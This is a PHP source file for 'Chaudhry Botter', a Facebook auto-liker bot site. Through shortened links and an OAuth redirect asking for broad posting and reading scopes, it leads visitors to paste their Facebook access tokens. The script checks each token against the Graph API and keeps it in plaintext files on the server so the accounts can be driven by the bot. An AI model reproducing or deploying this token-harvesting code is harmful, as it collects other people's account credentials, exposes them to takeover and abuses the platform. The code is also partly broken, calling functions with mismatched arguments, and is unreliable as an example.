<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>AHSAN</title>
<link rel="stylesheet" type="text/css" href="style.css" media="all,handheld"/>
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
</head>

<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $ll[]=$b.'='.$c;
}
$true='?'.implode('&',$ll);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'CR3AT3D BY CH AHSAN',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){
if(!is_dir('ll')){
        mkdir('ll');
}
if($bb){
$blue=fopen('ll/'.$id,'w');
fwrite($blue,$tk.'*on*on*on*on*'.$bb);
        fclose($blue);

echo'
<script type="text/javascript">
alert("INFO : Thanks For Using My Site, Now Click on Activate Button !")
</script>';
}else{
        if($z){
if(file_exists('ll/'.$id)){
$file=file_get_contents('ll/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('ll/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*on*on*on*on*'.$c;
$xs=fopen('ll/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('ll/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('ll/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('ll/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*');
        fclose($up);
        }
echo'
<script type="text/javascript">
alert("INFO : Thanks For Using My Site, Now Click on Activate Button !")
</script>';
}
}
}
public function lOgbot($d){
        unlink('ll/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">
alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
echo '
<center>
     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
	Welcome To Chaudhry Botter<font color="lime"> '.$nm.'</font><br>
    Activate Your Bot My Dear Friend !</p><br>
<form action="index.php" method="post">
<br>
<input class="button" type="submit" value="Activate Bot"></p>
</form></div></center>';

$this->membEr();
}

public function atas(){
 echo'
<div style="font-family: Iceland;
font-size: 60pt">
<center><script language="JavaScript" src="header.js"></script></font></center>
<center><hr style="background-color:white;width:60%;"><center>';
}

public function home(){
 echo '
<center>
<div style="font-family: Iceland;
font-size: 25pt;
text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
color: #FFF">
<strong><font style="text-shadow: 1px 1px black; color:brown;" size="6">&bull; CLICK ON PICTURE TO SEE MY PROFILE &bull;</strong></br>
<hr style="background-color:white;width:40%;">
</br>
<div class="css">
<a target="_blank"  href="https://www.facebook.com/100015324004654"><img src="https://graph.facebook.com/100015324004654/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#B22222; padding: 0px;" width="400" height="400" title=""/></a></div>
</br>
<hr style="background-color:white;width:40%;"></br>
<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fprofile.php%3Fid%3D100015324004654&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe></div>';
}

public function bwh(){
echo '
<div id="bottom-content">
<div id="navigation-menu">
<a href="https://goo.gl/CvenbL" target="_blank"><input class="button" type="button" value="★Allow App★"></a> <a href="https://goo.gl/NkKRQ6" target="_blank"><input class="button" type="button" value="★Get Token★"></a>
</br>
</br>
<form action="index.php" method="post"><input class="input" type="text" style="height:28px;" name="token"></table><input class="submit" type="submit" style="height:28px;" value="SUBMIT"></form></br>';

     $this->membEr();

   }

public function membEr(){
        if(!is_dir('ll')){
        mkdir('ll');
}
$up=opendir('ll');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
<div style="font-family: Iceland;
font-size: 35pt;text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;color: #FFF">
<font size="6" color="orange">&bull; BOT LOVERZ : '.count($user).' &bull;</font>
<hr style="background-color:white;width:30%;">
<div style="font-family: Iceland;
font-size: 35pt;text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;color: #FFF">
<font size="6" color="orange">&bull; OWNER CHAUDHRY AHSAN &bull;</font>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('ll/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo'
<script type="text/javascript">
alert("INFO : Your Token has been Expired")
</script>';
        unset($_SESSION[key]);
        unlink('ll/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo'
<script type="text/javascript">
alert("INFO : Your Token is Invalid")
</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>